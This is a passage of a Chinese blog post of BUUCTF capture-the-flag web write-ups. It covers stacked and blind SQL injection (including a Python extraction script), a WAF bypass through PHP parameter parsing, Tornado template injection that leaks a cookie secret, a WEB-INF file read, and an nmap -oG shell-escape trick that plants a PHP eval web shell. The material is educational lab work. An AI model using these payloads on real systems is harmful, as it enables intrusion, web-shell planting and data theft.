class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;query&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$BlackList</span> = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile</span></span><br><span class="line"><span class="string">        			|readfile|where|from|union|update|delete|if|sleep|extractvalue|</span></span><br><span class="line"><span class="string">    			    updatexml|or|and|&amp;|\&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">&#123;$BlackList&#125;</span>/is&quot;</span>,<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post[&#x27;query&#x27;];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nonono.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Too long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br><span class="line">        mysqli_multi_query(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> = mysqli_store_result(<span class="variable">$MysqlLink</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$res</span>))&#123;</span><br><span class="line">                    print_r(<span class="variable">$row</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result(<span class="variable">$MysqlLink</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>堆叠注入</p>
<p>有表flag；但是flag被过滤了</p>
<p>通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名  from 表名，进一步进行猜测即为select post进去的数据||flag from  Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</p>
<p>解法1</p>
<p>输入的内容为*,1</p>
<p>内置的sql语句为sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;</p>
<p>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
<p>解法2</p>
<p>输入的内容为1;set sql_mode=pipes_as_concat;select 1</p>
<p>其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42373127/article/details/88866710">sql_mode</a></p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开源码，有一个Secret.php，打开后：</p>
<p><img src="/2022/05/05/buu/image-20220506143959394.png" alt="image-20220506143959394"></p>
<p>bp或者hackbar修改请求头：<img src="/2022/05/05/buu/image-20220506144045568.png" alt="image-20220506144045568"></p>
<p><img src="/2022/05/05/buu/image-20220506144148137.png" alt="image-20220506144148137"></p>
<p>还要更换浏览器</p>
<p><img src="/2022/05/05/buu/image-20220506144307847.png" alt="image-20220506144307847"></p>
<p>还要在本地访问，更改访问的地址</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>-Forwarded-For 是一个 HTTP 扩展头部。HTTP/<span class="number">1</span>.<span class="number">1</span>（RFC <span class="number">2616</span>）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC <span class="number">7239</span>（Forwarded HTTP Extension）标准之中。</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For 请求头格式非常简单，就这样：</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For: client, proxy<span class="number">1</span>, proxy<span class="number">2</span></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For: <span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/buu/image-20220506144507558.png" alt="image-20220506144507558"></p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="/2022/05/05/buu/image-20220506150957107.png" alt="image-20220506150957107"></p>
<p>PHP的字符串解析特性</p>
<p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<p>1.删除空白符</p>
<p>2.将某些字符转换为下划线（包括空格）</p>
<p>假如waf不允许num变量传递字母：</p>
<pre><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
</code></pre>
<p>那么我们可以在num前加个空格：</p>
<pre><code>http://www.xxx.com/index.php? num = aaaa
</code></pre>
<p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。<br>首先我们要先扫根目录下的所有文件，也就是是scandir(“/“),但是“/”被过滤了，所以我们用chr(“47”)绕过,发现flagg文件</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">? num=var_dump(scandir(<span class="built_in">chr</span>(<span class="number">47</span>)));  <span class="comment">//f1agg文件</span></span><br><span class="line">我们利用<span class="built_in">chr</span>这个函数来构造函数内的字符串参数，就不需要用单双引号，从而成功绕过正则表达式。</span><br><span class="line"></span><br><span class="line">然后去读取这个文件就可以了，直接放patload：</span><br><span class="line">calc.php? num=<span class="number">1</span>;var_dump(file_get_contents(<span class="built_in">chr</span>(<span class="number">47</span>).<span class="built_in">chr</span>(<span class="number">102</span>).<span class="built_in">chr</span>(<span class="number">49</span>).<span class="built_in">chr</span>(<span class="number">97</span>).<span class="built_in">chr</span>(<span class="number">103</span>).<span class="built_in">chr</span>(<span class="number">103</span>)))</span><br><span class="line">或者：/calc.php? num=var_dump(file_get_contents(<span class="built_in">chr</span>(<span class="number">47</span>).f1agg));</span><br><span class="line">calc.php? num=highlight_file(<span class="built_in">chr</span>(<span class="number">47</span>).f1agg);</span><br><span class="line">calc.php? num=file_get_contents(<span class="built_in">chr</span>(<span class="number">47</span>).f1agg);</span><br><span class="line">calc.php? num=show_source(<span class="built_in">chr</span>(<span class="number">47</span>).f1agg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">chr</span>()就是将ASCII码中的数字转化为其对应的字符,例如<span class="built_in">chr</span>(<span class="number">97</span>)就是字符<span class="string">&#x27;a&#x27;</span>。 </span><br></pre></td></tr></table></figure>

<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开题目后，首先发现3个超链接<img src="/2022/05/05/buu/image-20220506160034474.png" alt="image-20220506160034474"></p>
<p>依次打开：</p>
<p><img src="/2022/05/05/buu/image-20220506160056258.png" alt="image-20220506160056258"></p>
<p>网址里有参数<code>filename</code>和<code>filehash</code>推测这里flag应该是</p>
<p><code>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</code>里面，filehash里<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a>就是提示为md5的hash加密</p>
<p>变量 filename 的值总是为要访问的文件，再根据提示三和 filehash 三个不同的值猜测 filehash 的值为<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a>加密后的字符串。</p>
<p>filename知道了，<code>cookie_secret</code>在哪呢？hints提示<code>render</code></p>
<p>又根据题目<code>easy_tornado</code>可推测是<strong>服务器模板注入。</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">扩展：SSTI注入</span><br><span class="line"></span><br><span class="line">SSTI就是服务器端模板注入(<span class="keyword">Server</span>-Side <span class="keyword">Template</span> Injection)，也给出了一个注入的概念。</span><br><span class="line"></span><br><span class="line">服务端模板：相当于很多公式，根据变量输出结果。这里的模板就是模板引擎根据数据自动生成前端页面。</span><br><span class="line"></span><br><span class="line">常见的注入有：<span class="keyword">SQL</span> 注入，XSS 注入，XPATH 注入，<span class="type">XML</span></span><br><span class="line">注入，代码注入，命令注入等等。<span class="keyword">sql</span>注入已经出世很多年了，对于<span class="keyword">sql</span>注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于<span class="keyword">sql</span>注入的。</span><br><span class="line"></span><br><span class="line"><span class="keyword">sql</span>注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的<span class="keyword">sql</span>语句，当然现在的<span class="keyword">sql</span>注入防范做得已经很好了，然而随之而来的是更多的漏洞。</span><br><span class="line"></span><br><span class="line">SSTI也是获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行。错误的执行了用户输入。类比于 <span class="keyword">sql</span></span><br><span class="line">注入。当然还是和<span class="keyword">sql</span>注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2</span><br><span class="line">mako tornado django，php的smarty twig，java的jade</span><br><span class="line">velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</span><br><span class="line">因为render（）是tornado里的函数，可以生成html模板。是一个渲染函数 ，就是一个公式，能输出前端页面的公式。</span><br><span class="line"></span><br><span class="line"> tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关，就可以推测这可能是个ssti注入题了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那我们开始初步尝试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=&#123;&#123;<span class="number">1</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>为什么使用双花括号?</p>
<pre><code>Tornado templates support control statements and expressions. Control
statements are surrounded by &#123;% %&#125;, e.g. &#123;% if len(items) > 2 %&#125;.
    Expressions are surrounded by &#123;&#123; &#125;&#125;, e.g. &#123;&#123; items[0] &#125;&#125;.
得到关键报错信息：
 ![image-20220506160641641](./buu/image-20220506160641641.png)

**模板注入必须通过传输型如&#123;&#123;xxx&#125;&#125;的执行命令**。探测方式很简单，给一个参数赋值`&#123;&#123;22*22&#125;&#125;`返回484则必然存在模板注入。

但是当我们输入`error?msg=&#123;&#123;1&#125;&#125;`就可以得到回显，说明此处是存在SSTI注入漏洞的。

![image-20220506160720515](./buu/image-20220506160720515.png)

当我构造的payload为：error?msg=&#123;&#123;2*2&#125;&#125;的时候，回显的结果是orz。因此我们可以猜测出，此处是出现了过滤。

此时我们需要找的是`cookie_secret`,搜素百度得Tornado框架的附属文件handler.settings中存在cookie_secret

Handler这个对象，Handler指向的处理当前这个页面的RequestHandler对象

    RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性
    
    handler 指向RequestHandler
    
    而RequestHandler.settings又指向self.application.settings
    
    所有handler.settings就指向RequestHandler.application.settings了！
此时构造payload:

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e8d1f189-e498-4c03-9b0f-4eef7c6c671c.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

![image-20220506161033168](buu/image-20220506161033168.png)

7c8d1cbe-8dfc-4824-b465-79ce33c97f59

此时的payload应该就是如下通过md5的结果：

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/fllllllllllllag))</span><br></pre></td></tr></table></figure>

**/fllllllllllllag**通过md5[加密](https://so.csdn.net/so/search?q=加密&spm=1001.2101.3001.7020)后：3bf9f6cf685a6dd8defadabfb41a03a1

md5(cookie_secret+md5(/fllllllllllllag))通过md5加密后的结果:

73d39a8638f8b59eaaa8563107280267

此时构造payload:

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=73d39a8638f8b59eaaa8563107280267</span><br></pre></td></tr></table></figure>

得到flag

## [HCTF 2018]admin

https://www.jianshu.com/p/f92311564ad0

##  [CISCN2019 华北赛区 Day2 Web1]Hack World

![image-20220506215158582](./buu/image-20220506215158582.png)

首页提示flag位于flag表的flag字段

直接输入

<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">select</span> flag <span class="keyword">from</span> flag;</span><br></pre></td></tr></table></figure>

显示sql注入检测

单独输入select关键字没有被过滤，说明过滤了空格

 使用语句

<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flag);</span><br></pre></td></tr></table></figure>

因为题目提示flag为uuid，uuid是32位随机字符串，所以需要编写python脚本来获取flag

 先写出一个核心的语句，判断flag的第一个字符是否ascii码为101

`if((ascii(substr((select(flag)from(flag)),1,1))=101),0,1)`
输出Hello，表示这个地方返回的1，说明第一个字符ascii码为101 

![image-20220506215334419](./buu/image-20220506215334419.png)

`if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1)`

Error表示此处返回0，第一个字符ascii码不为102

`payload：id=1^(length(select(flag)from(flag))>10)`来判断flag长度为42位，这里可以用括号替代空格，也可以同[tab]及其他未过滤的空白符替代空格。然后利用strsub()函数逐位爆出flag，脚本如下：

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://fc3de8f9-bb06-4116-adc8-5455bb0a809f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">43</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        s = (<span class="built_in">int</span>)((<span class="built_in">max</span>+<span class="built_in">min</span>)/<span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">&#x27;1^(ascii(substr((select(flag)from(flag)),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1))&gt;&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        r = requests.post(url,data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(r.content):</span><br><span class="line">            <span class="built_in">max</span>=s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span>=s</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">max</span>-<span class="built_in">min</span>)&lt;=<span class="number">1</span>):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">max</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

## [RoarCTF 2019]Easy Java

知识点

- web.xml泄露
- filter伪协议读取

![image-20220506220827618](./buu/image-20220506220827618.png)

点击help：`java.io.FileNotFoundException:&#123;help.docx&#125;`

发现filename=help.docx有可能可以进行文件读取，尝试php://filter/read=convert.base64-encode/resource=help.docx无果，查看wp，知道可以尝试将请求方式由GET换为POST，POST后，得到help.docx，如图所示
![image-20220506220941503](./buu/image-20220506220941503.png)

![image-20220506221814199](./buu/image-20220506221814199.png)

下载了help.docx

![image-20220506221851584](./buu/image-20220506221851584.png)

题目提示JavaWeb，所以尝试读取WEB-INF/web.xml，javaweb程序的配置文件，javaweb所有的文件一般都放在WEB-INF里面。

![image-20220506222045013](./buu/image-20220506222045013.png)

我们直接访问Flag目录，出现500错误：

由于javaweb的代码文件放在WEB-INF/classes下面，所以：
我们要以POST方式访问filename=WEB-INF/classes/com/wm/ctf/FlagController.class

![image-20220506222353022](./buu/image-20220506222353022.png)

解码即可

WEB-INF主要包含以下文件或目录: /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，通过反编译class文件，得到网站源码

## [BUUCTF 2018]Online Tool

![image-20220507213348076](./buu/image-20220507213348076.png)

很简洁的一个rce 不难看出是让我们传一个参数名为host 值为一个ip的参数 然后对这个ip进行nmap扫描 我们传入的ip会先后经过escapeshellarg和escapeshellcmd的转义 这两个函数是解题点 下面贴上这俩函数的用法[escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php) [escapeshellcmd](https://www.php.net/manual/zh/function.escapeshellcmd.php)

首先是escapeshellarg 他的作用就是将单引号转义 并将转义后的单引号的前后两部分再用一个单引号括上 这边贴上一个例子

<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span>&#x27; ls ---&gt; &#x27;<span class="number">123</span>&#x27;\&#x27;&#x27; ls&#x27;</span><br><span class="line">注意引号和空格的位置 很关键</span><br></pre></td></tr></table></figure>

escapeshellcmd

<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在&amp;#;`|<span class="symbol">\?</span>~&lt;&gt;^()[]&#123;&#125;$, <span class="symbol">\x</span>0A 和 <span class="symbol">\x</span>FF和没有配对的单引号前插入&quot;<span class="symbol">\&quot;</span> 注意注意注意注意 没有配对的单引号</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;123&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="built_in">ls</span><span class="string">&#x27; ---&gt; &#x27;</span><span class="number">123</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27; ls\&#x27;</span></span><br></pre></td></tr></table></figure>

在上面的那行代码里 只有最后的那一个单引号是没有配对的 中间的那俩并在一起的其实是配对了

nmap的-oG命令可以写入文件 而可能有一个会让人疑惑的点 我用-oG写一个马 但是马里面的所有字符都被转义了 那马还能用吗 答案是可以的 转义只是让这个字符串不能参与命令的执行 但是写在文件里面他还是一个马

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">123&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27; </span></span><br><span class="line"><span class="xml">---&gt; &#x27;123&#x27;\&#x27;&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;\&#x27;&#x27;&#x27;(每转义一个单引号 单引号前后部分都用单引号括起来</span></span><br><span class="line"><span class="xml">&#x27;123&#x27;\&#x27;&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;\&#x27;&#x27;&#x27; ---&gt; &#x27;123&#x27;\\&#x27;&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;\\&#x27;&#x27;&#x27;(偶数单引号 两两配对</span></span><br></pre></td></tr></table></figure>

如果最后没加引号这个就不用解释了 如果没加引号 最后会变成这样

<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;<span class="symbol">\\</span>&#x27;&#x27; <span class="symbol">\&lt;</span><span class="symbol">\?</span>php phpinfo<span class="symbol">\(</span><span class="symbol">\)</span><span class="symbol">\;</span><span class="symbol">\?</span><span class="symbol">\&gt;</span> -oG hack.php<span class="symbol">\&#x27;</span></span><br></pre></td></tr></table></figure>

有一部分人肯定在最后加了引号没加空格 如果没加空格会怎么样

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;123&#x27;</span>\\<span class="string">&#x27;&#x27;</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span> -oG hack.php<span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

'\'这个字符很关键 在你将传的字符串写成一个文件的时候 他代表这在.php后面会跟着一个\ 变成.php\ 这很明显也是我们不想要的 没错了就可以包含了 文件地址就在sandbox里 菜刀拿到flag

payload理解：payload:`?host=' <?php eval($_POST["v"]);?> -oG shell.php '`

两边加单引号是因为，不加的话，两个函数执行后会变成：

    '<?php eval($_POST["v"]);?> -oG shell.php'

就不是一条命令了，而是一串字符串而已，因为在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。
引号旁边加空格是因为，如果不加，当两个函数执行并echo出来后就会变成：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;v&quot;</span>]);<span class="meta">?&gt;</span> -oG shell.php\\</span><br></pre></td></tr></table></figure>

文件名是`shell.php\\`，而不是`shell.php`

参数V不能用单引号，而是用双引号:

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">escapeshellarg()转单引号后，紧接着escapeshellcmd()又会对敏感字符\转义，就是比如拿这道题来说：</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">传这个进去：&#x27; </span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG shell.php &#x27;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">escapeshellarg()后：&#x27;&#x27;\&#x27;&#x27;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;\&#x27;&#x27;</span>v<span class="string">&#x27;\&#x27;&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG shell.php &#x27;\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">escapeshellcmd()后：&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[&#x27;\\&#x27;&#x27;v&#x27;\\&#x27;&#x27;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">echo出来，这里看单引号闭合，从一个单引号数下去，和离他最近的引号闭合，\\转义成\类推，如果是&#x27;\\&#x27;是没有转义的，直接就是\\所以就是：</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">\</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[\\v\]);<span class="meta">?&gt;</span></span><span class="xml"> -oG shell.php \\</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

可以直接用反引号执行的：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG shell12.php &#x27;</span></span><br></pre></td></tr></table></figure>

## [BJDCTF2020]ZJCTF，不过如此

![image-20220508200559939](./buu/image-20220508200559939.png)

得到next.php的文件内容：

